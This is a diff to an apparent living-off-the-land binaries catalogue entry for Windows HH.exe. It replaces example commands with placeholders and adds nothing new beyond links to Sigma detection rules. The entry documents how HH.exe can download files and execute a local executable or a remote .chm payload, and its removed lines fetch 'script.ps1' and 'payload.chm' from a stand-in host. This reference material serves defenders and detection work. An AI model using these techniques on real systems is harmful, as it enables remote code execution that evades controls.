@@ -1,11 +1,11 @@
 ---
 Name: Hh.exe
 Description: Binary used for processing chm files in Windows
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: HH.exe http://some.url/script.ps1
-    Description: Open the target PowerShell script with HTML Help.
+  - Command: HH.exe {REMOTEURL:.bat}
+    Description: Open the target batch script with HTML Help.
     Usecase: Download files from url
     Category: Download
     Privileges: User
@@ -14,8 +14,8 @@ Commands:
     Tags:
       - Execute: EXE
       - Application: GUI
-  - Command: HH.exe c:\windows\system32\calc.exe
-    Description: Executes calc.exe with HTML Help.
+  - Command: HH.exe {PATH_ABSOLUTE:.exe}
+    Description: Executes specified executable with HTML Help.
     Usecase: Execute process with HH.exe
     Category: Execute
     Privileges: User
@@ -24,8 +24,8 @@ Commands:
     Tags:
       - Execute: EXE
       - Application: GUI
-  - Command: HH.exe http://some.url/payload.chm
-    Description: Executes a remote payload.chm file which can contain commands.
+  - Command: HH.exe {REMOTEURL:.chm}
+    Description: Executes a remote .chm file which can contain commands.
     Usecase: Execute commands with HH.exe
     Category: Execute
     Privileges: User
@@ -38,8 +38,6 @@ Commands:
 Full_Path:
   - Path: C:\Windows\hh.exe
   - Path: C:\Windows\SysWOW64\hh.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_chm_execution.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml
